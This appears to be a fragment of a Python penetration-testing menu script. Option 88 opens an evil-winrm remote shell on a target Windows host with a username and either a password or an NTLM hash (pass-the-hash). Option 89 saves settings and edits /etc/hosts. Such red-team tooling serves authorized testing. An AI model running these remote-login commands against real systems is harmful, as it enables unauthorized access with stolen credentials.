# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - WINRM remote login using PORT 5985
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection =='88':
      checkParams = testOne()
      
      if checkParams != 1:            
         if NTM[:5] != "EMPTY":
            print("[" + colored("i", colour2) + "] Using the HASH value as a password credential...")
            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -H :" + NTM.rstrip(" ") + " -s " + httpDir + " -e " + httpDir)
         else:
            command("evil-winrm -i " + TIP.rstrip(" ") + " -u " + USR.rstrip(" ") + " -p '" + PAS.rstrip(" ") + "' -s " + httpDir + " -e " + httpDir)
      prompt() 
                 
# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : TREADSTONE                                                             
# Details : Menu option selected - Save config to dataDir/config.txt and exit program
# Modified: N/A
# -------------------------------------------------------------------------------------

   if selection == '89':        
      saveParams()
      
      if DOMC == 1:
         print("[" + colored("*", colour8) + "] Removing domain name from /etc/hosts...")
         command("sed -i '$d' /etc/hosts")
       
      print("[" + colored("*", colour8) + "] Program sucessfully terminated...")
      exit(1)
# Eof...	